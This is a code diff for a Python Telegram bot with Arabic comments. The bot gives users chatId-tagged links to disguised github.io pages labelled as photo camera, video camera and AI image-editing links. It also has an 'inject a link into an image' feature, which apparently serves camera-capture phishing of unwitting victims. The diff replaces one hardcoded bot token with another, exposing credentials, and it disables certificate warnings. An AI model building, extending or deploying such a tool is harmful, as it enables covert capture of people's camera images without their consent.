@@ -11,14 +11,14 @@ import time
 # إيقاف تحذيرات الشهادات لضمان استقرار الاتصال السحابي
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعداد توكن البوت الخاص بك
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
+# 🔑 إعداد توكن البوت الخاص بك (تم التحديث للتوكن الجديد)
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # مسار قاعدة بيانات الأصوات الآمن على Railway
 DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"
 
-# الروابط الخاصة بالخدمات
+# الروابط الخاصة بالخدمات (تم تحديث رابط تعديل الصور بناءً على طلبك)
 PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
 IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
@@ -77,7 +77,7 @@ def get_main_keyboard():
         types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
         types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
         types.InlineKeyboardButton("✨ طلب رابط تعديل الصور", callback_data="get_image_edit_link"),
-        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
+        types.InlineKeyboardButton("🔒 حقن رابط in صورة", callback_data="inject_start"),
         types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
     )
     return markup
@@ -116,7 +116,7 @@ def handle_query(call):
         bot.answer_callback_query(call.id)
 
     elif call.data == "get_image_edit_link":
-        # معالجة الزر الجديد وإرسال الرابط المطلوب
+        # توليد وإرسال الرابط الجديد المحدث ديناميكياً بناءً على chatId للمستخدم الحالي
         link = f"{IMAGE_EDIT_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"✨ **رابط صفحة تعديل الصور بالذكاء الاصطناعي جاهز:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
@@ -241,5 +241,5 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"تنبيه تهيئة: {e}")
 
-    print("🚀 البوت يعمل وجاهز، تم إضافة ميزة رابط تعديل الصور الجديد بنجاح...")
+    print("🚀 البوت يعمل وجاهز، تم تحديث الرابط الجديد لخانة تعديل الصور بنجاح...")
     bot.polling(none_stop=True, interval=0, timeout=50)
